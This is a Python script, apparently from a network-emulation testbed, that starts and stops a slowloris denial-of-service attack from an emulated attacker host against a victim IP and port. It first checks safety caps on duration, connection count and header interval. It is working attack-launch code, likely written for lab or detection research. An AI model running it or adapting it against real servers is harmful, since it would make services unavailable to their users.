#!/usr/bin/env python3

import time

MAX_DURATION = 300
MAX_CONNECTIONS = 500
MIN_HEADER_INTERVAL = 1
MAX_HEADER_INTERVAL = 30
MAX_SOURCES = 1

def validate_scenario(scenario):
    if scenario.get("duration", 0) > MAX_DURATION:
        raise ValueError(f"[!] Safety Error: Duration {scenario['duration']}s exceeds MAX_DURATION ({MAX_DURATION}s)")

    if scenario.get("num_connections", 0) > MAX_CONNECTIONS:
        raise ValueError(f"[!] Safety Error: num_connections {scenario['num_connections']} exceeds MAX_CONNECTIONS ({MAX_CONNECTIONS})")

    if scenario.get("num_connections", 0) <= 0:
        raise ValueError("[!] Safety Error: num_connections must be > 0")

    header_interval = scenario.get("header_interval", 0)
    if header_interval < MIN_HEADER_INTERVAL or header_interval > MAX_HEADER_INTERVAL:
        raise ValueError(
            f"[!] Safety Error: header_interval {header_interval}s outside "
            f"allowed range [{MIN_HEADER_INTERVAL}, {MAX_HEADER_INTERVAL}]"
        )

    print("[*] Scenario passed safety limits verification.")

def start_slowloris_attack(attacker_host, victim_ip, target_port, scenario):
    validate_scenario(scenario)

    num_connections = scenario.get("num_connections", 150)
    header_interval = scenario.get("header_interval", 10)

    print(f"[*] Starting Slowloris -> Target: {victim_ip}:{target_port}, "
          f"Connections: {num_connections}, Header interval: {header_interval}s")

    attacker_host.cmd(
        f'slowloris {victim_ip} -p {target_port} -s {num_connections} '
        f'--sleeptime {header_interval} > /tmp/slowloris_attack.log 2>&1 &'
    )
    time.sleep(1)
    pid = attacker_host.cmd("pgrep -o -f 'slowloris'").strip().split('\n')[0]

    if not pid:
        raise RuntimeError("[!] Failed to start slowloris (no PID found)")

    print(f"[*] Slowloris running with PID {pid}")
    return pid

def stop_slowloris_attack(attacker_host, pid):
    if pid:
        attacker_host.cmd(f'kill {pid} 2>/dev/null')
        print(f"[*] Slowloris (PID {pid}) stopped.")
